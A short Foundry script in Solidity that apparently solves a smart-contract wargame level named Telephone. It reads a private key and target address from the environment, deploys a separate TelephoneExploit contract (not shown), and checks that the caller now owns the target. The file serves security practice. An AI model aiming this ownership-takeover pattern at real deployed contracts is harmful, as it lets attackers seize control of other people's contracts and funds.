pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {VmSafe} from "forge-std/Vm.sol";
import {Telephone} from "../src/Level04.sol";
import {TelephoneExploit} from "../src/Level04Exploit.sol";

contract Level04Script is Script {
    function run() public {
        VmSafe.Wallet memory wallet = vm.createWallet(vm.envUint("PRIVATE_KEY"));

        address payable contractAddress = payable(vm.envAddress("CONTRACT"));

        vm.startBroadcast(wallet.privateKey);
        exploit(contractAddress, wallet.addr);
        vm.stopBroadcast();

        require(levelDone(contractAddress, wallet.addr), "Solution failed");
    }

    function exploit(address target, address attacker) private {
        new TelephoneExploit(address(target), attacker);
    }

    function levelDone(address target, address attacker) private view returns (bool) {
        return Telephone(target).owner() == attacker;
    }
}
